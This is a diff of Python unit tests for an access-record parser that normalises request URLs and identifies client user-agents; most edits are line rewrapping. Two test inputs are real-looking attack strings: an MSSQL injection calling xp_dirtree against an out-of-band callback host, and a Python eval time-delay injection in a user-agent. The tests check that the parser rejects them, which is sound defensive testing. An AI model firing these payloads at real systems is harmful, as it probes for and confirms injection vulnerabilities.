@@ -182,7 +182,6 @@ class TestTransformedAccessRecord(unittest.TestCase):
             "/repo/v1/entity/syn25830585/version/1/json")
         self.assertEqual(expected_output, real_output)
 
-
     def test_normalized_signature_for_team_member_with_query_parameters(self):
         expected_output = "/teammembers/#"
         real_output = process_access_record.get_normalized_method_signature(
@@ -223,8 +222,8 @@ class TestTransformedAccessRecord(unittest.TestCase):
     def test_normalized_signature_for_invalid_url(self):
         expected_output = "INVALID URL"
         real_output = process_access_record.get_normalized_method_signature("/repo/v1;declare%20@q%20varchar(99);"
-        "set%20@q='%5C%5Caq4fvux4xlr4dgezayhg3rmryi4es8p9oxfn3kqbe0.oasti'+' %5Cicr';%20exec%20master.dbo.xp_dirtree"
-         "%20@q;--%20/user/bundle")
+                                                                            "set%20@q='%5C%5Caq4fvux4xlr4dgezayhg3rmryi4es8p9oxfn3kqbe0.oasti'+' %5Cicr';%20exec%20master.dbo.xp_dirtree"
+                                                                            "%20@q;--%20/user/bundle")
         self.assertEqual(expected_output, real_output)
 
     def test_get_client_for_web(self):
@@ -274,12 +273,14 @@ class TestTransformedAccessRecord(unittest.TestCase):
 
     def test_get_client_for_mozilla(self):
         expected_output = "WEB"
-        real_output = process_access_record.get_client("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36")
+        real_output = process_access_record.get_client(
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36")
         self.assertEqual(expected_output, real_output)
 
     def test_get_client_for_opera(self):
         expected_output = "WEB"
-        real_output = process_access_record.get_client("Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00")
+        real_output = process_access_record.get_client(
+            "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00")
         self.assertEqual(expected_output, real_output)
 
     def test_get_client_for_chrome(self):
@@ -299,12 +300,14 @@ class TestTransformedAccessRecord(unittest.TestCase):
 
     def test_get_client_for_ucweb(self):
         expected_output = "WEB"
-        real_output = process_access_record.get_client("UCWEB/2.0 (MIDP-2.0; U; Adr 4.4.4; en-US; SM-G360H) U2/1.0.0 UCBrowser/10.9.0.946 U2/1.0.0 Mobile")
+        real_output = process_access_record.get_client(
+            "UCWEB/2.0 (MIDP-2.0; U; Adr 4.4.4; en-US; SM-G360H) U2/1.0.0 UCBrowser/10.9.0.946 U2/1.0.0 Mobile")
         self.assertEqual(expected_output, real_output)
 
     def test_get_client_for_unknown(self):
         expected_output = "UNKNOWN"
-        real_output = process_access_record.get_client("eval(compile('for x in range(1):\\n import time\\n time.sleep(20)','a','single')) qdnui440vl1")
+        real_output = process_access_record.get_client(
+            "eval(compile('for x in range(1):\\n import time\\n time.sleep(20)','a','single')) qdnui440vl1")
         self.assertEqual(expected_output, real_output)
 
     def test_get_client_for_none(self):
@@ -314,7 +317,8 @@ class TestTransformedAccessRecord(unittest.TestCase):
 
     def test_get_client_version_for_web(self):
         expected_output = "435.0"
-        real_output = process_access_record.get_client_version("WEB", "Synapse-Java-Client/431.0 Synapse-Web-Client/435.0")
+        real_output = process_access_record.get_client_version("WEB",
+                                                               "Synapse-Java-Client/431.0 Synapse-Web-Client/435.0")
         self.assertEqual(expected_output, real_output)
 
     def test_get_client_version_for_java(self):
@@ -360,29 +364,33 @@ class TestTransformedAccessRecord(unittest.TestCase):
     def test_get_client_version_for_mozilla(self):
         expected_output = "5.0"
         real_output = process_access_record.get_client_version("WEB", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-         "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36")
+                                                                      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36")
         self.assertEqual(expected_output, real_output)
 
     def test_get_client_version_for_opera(self):
         expected_output = "9.80"
-        real_output = process_access_record.get_client_version("WEB", "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.0")
+        real_output = process_access_record.get_client_version("WEB",
+                                                               "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.0")
         self.assertEqual(expected_output, real_output)
 
     def test_get_client_version_for_lynx(self):
         expected_output = "2.8.5rel.5"
-        real_output = process_access_record.get_client_version("WEB", "Lynx/2.8.5rel.5 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8e")
+        real_output = process_access_record.get_client_version("WEB",
+                                                               "Lynx/2.8.5rel.5 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8e")
         self.assertEqual(expected_output, real_output)
 
     def test_get_client_version_for_ucweb(self):
         expected_output = "2.0"
-        real_output = process_access_record.get_client_version("WEB", "UCWEB/2.0 (MIDP-2.0; U; Adr 4.4.4; en-US; SM-G360H)"
-          " U2/1.0.0 UCBrowser/10.9.0.946 U2/1.0.0 Mobile")
+        real_output = process_access_record.get_client_version("WEB",
+                                                               "UCWEB/2.0 (MIDP-2.0; U; Adr 4.4.4; en-US; SM-G360H)"
+                                                               " U2/1.0.0 UCBrowser/10.9.0.946 U2/1.0.0 Mobile")
         self.assertEqual(expected_output, real_output)
 
     def test_get_client_version_for_chromium(self):
         expected_output = "5.0"
-        real_output = process_access_record.get_client_version("WEB", "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 "
-         "(KHTML, like Gecko) Ubuntu Chromium/115.0.5805.207 Chrome/115.0.5805.207 Safari/537.36")
+        real_output = process_access_record.get_client_version("WEB",
+                                                               "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 "
+                                                               "(KHTML, like Gecko) Ubuntu Chromium/115.0.5805.207 Chrome/115.0.5805.207 Safari/537.36")
         self.assertEqual(expected_output, real_output)
 
     def test_get_client_version_for_chrome(self):
@@ -391,7 +399,8 @@ class TestTransformedAccessRecord(unittest.TestCase):
 
     def test_get_client_version_for_safari(self):
         expected_output = "15609.4.1"
-        real_output = process_access_record.get_client_version("WEB", "Safari/15609.4.1 CFNetwork/1128.0.1 Darwin/19.6.0 (x86_64)")
+        real_output = process_access_record.get_client_version("WEB",
+                                                               "Safari/15609.4.1 CFNetwork/1128.0.1 Darwin/19.6.0 (x86_64)")
         self.assertEqual(expected_output, real_output)
 
     def test_get_client_version_for_unknown(self):
